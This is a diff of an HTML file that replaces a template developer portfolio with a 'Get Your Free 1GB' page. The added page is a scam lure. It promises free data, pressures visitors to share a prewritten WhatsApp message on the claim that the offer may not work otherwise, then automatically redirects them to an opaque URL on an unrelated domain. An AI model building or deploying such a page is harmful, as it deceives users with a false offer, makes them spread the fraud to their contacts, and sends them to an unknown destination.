@@ -2,98 +2,104 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Samuel's Portfolio</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="google-adsense-account" content="ca-pub-9905309315543268">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+<title>Get Your Free 1GB</title>
 <style>
-body{font-family:sans-serif;background:#f5f5f5;margin:0;padding:0;}
-header{background:#003366;color:#fff;padding:60px 20px;text-align:center;}
-header h1{margin-bottom:10px;}
-header p{font-size:1.2em;}
-section{padding:40px 20px;}
-h2{margin-bottom:20px;}
-.project-card{background:#fff;padding:20px;margin-bottom:20px;border-radius:10px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
-.project-card img{width:100%;height:auto;border-radius:8px;}
-.ad-slot{margin:20px 0;text-align:center;}
-footer{background:#003366;color:#fff;padding:20px;text-align:center;}
-a{color:#003366;text-decoration:none;}
-</style>
+  body, html {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    height: 100%;
+    text-align: center;
+  }
 
-<!-- AdSense Script -->
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9905309315543268"
-     crossorigin="anonymous"></script>
+  .page {
+    display: none;
+    height: 100vh;
+  }
+
+  .active {
+    display: block;
+  }
+
+  img {
+    width: 100%;
+    height: 33vh;
+    object-fit: cover;
+  }
+
+  .content {
+    height: 67vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  button, .share-btn {
+    padding: 15px 30px;
+    font-size: 18px;
+    margin: 10px;
+    cursor: pointer;
+  }
+
+  .share-btn {
+    background-color: #25D366; /* WhatsApp green */
+    color: white;
+    border: none;
+    border-radius: 5px;
+    text-decoration: none;
+  }
+</style>
 </head>
 <body>
 
-<header>
-<h1>Samuel's Portfolio</h1>
-<p>Web Developer | Designer | Tech Enthusiast</p>
-</header>
-
-<section id="about">
-<h2>About Me</h2>
-<p>Hello! I'm Samuel, a passionate web developer focused on creating modern, responsive websites and apps. I love building projects that solve real problems and learning new technologies every day.</p>
-</section>
-
-<section id="projects">
-<h2>My Projects</h2>
-
-<div class="project-card">
-<img src="https://via.placeholder.com/600x300?text=Project+1" alt="Project 1">
-<h3>Project One</h3>
-<p>Short description of Project One.</p>
-<a href="#">View Project</a>
+<!-- Step 1 -->
+<div id="step1" class="page active">
+  <img src="https://i.ibb.co/QFC3FR9z/images-15.jpg" alt="Landing Image">
+  <div class="content">
+    <button onclick="nextStep(2)">Get it now ↓</button>
+  </div>
 </div>
 
-<!-- AdSense Slot -->
-<div class="ad-slot">
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-9905309315543268"
-     data-ad-slot="1234567890"></ins>
+<!-- Step 2 -->
+<div id="step2" class="page">
+  <div class="content">
+    <h2>Share to Continue</h2>
+    <p>It is advisable to share with other users; it might not work if you don’t.</p>
+    <a href="https://api.whatsapp.com/send?text=Check%20out%20this%20amazing%20site%20and%20get%201GB!" 
+       target="_blank" class="share-btn" onclick="showContinue()">Share on WhatsApp</a>
+    <br>
+    <button id="continueBtn" onclick="nextStep(3)" style="display:none;">Continue</button>
+  </div>
+</div>
+
+<!-- Step 3 -->
+<div id="step3" class="page">
+  <div class="content">
+    <h2>Redirecting...</h2>
+    <p>Taking you to other websites...</p>
+  </div>
+</div>
+
 <script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
+  function nextStep(step) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('step' + step).classList.add('active');
+
+    if (step === 3) {
+      // Replace with your actual URLs
+      setTimeout(() => {
+        window.location.href = 'https://obvioussecretive.com/rwj2iaik6g?key=d39bd78c2ae2358792721a701a778ba9';
+      }, 2000); // 2 seconds before redirect
+    }
+  }
+
+  function showContinue() {
+    document.getElementById('continueBtn').style.display = 'inline-block';
+  }
 </script>
-</div>
-
-<div class="project-card">
-<img src="https://via.placeholder.com/600x300?text=Project+2" alt="Project 2">
-<h3>Project Two</h3>
-<p>Short description of Project Two.</p>
-<a href="#">View Project</a>
-</div>
-
-<!-- AdSense Slot -->
-<div class="ad-slot">
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-9905309315543268"
-     data-ad-slot="1234567891"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-</div>
-
-<div class="project-card">
-<img src="https://via.placeholder.com/600x300?text=Project+3" alt="Project 3">
-<h3>Project Three</h3>
-<p>Short description of Project Three.</p>
-<a href="#">View Project</a>
-</div>
-
-</section>
-
-<section id="contact">
-<h2>Contact Me</h2>
-<p>Email: <a href="mailto:youremail@example.com">youremail@example.com</a></p>
-<p>LinkedIn: <a href="#">linkedin.com/in/yourprofile</a></p>
-<p>GitHub: <a href="#">github.com/yourusername</a></p>
-</section>
-
-<footer>
-<p>© 2025 Samuel. All Rights Reserved.</p>
-</footer>
 
 </body>
 </html>
